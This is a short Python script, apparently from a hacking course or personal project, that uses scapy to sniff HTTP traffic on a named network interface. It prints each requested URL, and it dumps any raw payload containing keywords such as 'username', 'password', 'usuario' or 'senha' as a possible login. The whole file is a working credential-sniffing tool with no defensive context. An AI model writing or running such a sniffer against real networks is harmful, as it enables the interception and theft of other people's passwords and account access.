import scapy.all as scapy
import scapy_http.http as http
# from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8")
        # if 'username' in load:
        #     print(load)
        keywords = ['username', 'user', 'login', 'usuario', 'password', 'pass', 'senha']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request > ' + url)
        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username/password > ' + login_info + '\n\n')


sniff('Realtek PCIe FE Family Controller')
